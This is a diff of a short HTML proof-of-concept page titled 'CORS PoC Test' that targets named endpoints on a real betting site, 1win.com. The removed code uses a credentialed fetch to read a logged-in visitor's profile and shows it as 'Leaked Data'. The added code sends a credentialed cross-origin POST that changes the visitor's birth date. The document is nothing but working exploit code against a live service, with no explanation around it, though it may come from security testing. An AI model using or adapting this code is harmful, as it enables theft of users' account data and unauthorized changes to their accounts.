@@ -8,15 +8,19 @@
 <h2>CORS PoC Test</h2>
 
 <script>
-fetch("https://1win.com/betwave/backend/profile", {
-  credentials: "include"
+fetch("https://1win.com/api/web/v1/user/api-v2-profile-update", {
+  method: "POST",
+  credentials: "include",
+  headers: {
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify({
+    birthday_date: "2005-01-02"
+  })
 })
-.then(response => response.text())
-.then(data => {
-  document.body.innerHTML += "<h3>Leaked Data:</h3><pre>" + data + "</pre>";
-  console.log("LEAK:", data);
-})
-.catch(error => console.error("Error:", error));
+.then(r => r.text())
+.then(d => console.log(d))
+.catch(e => console.error(e));
 </script>
 
 </body>
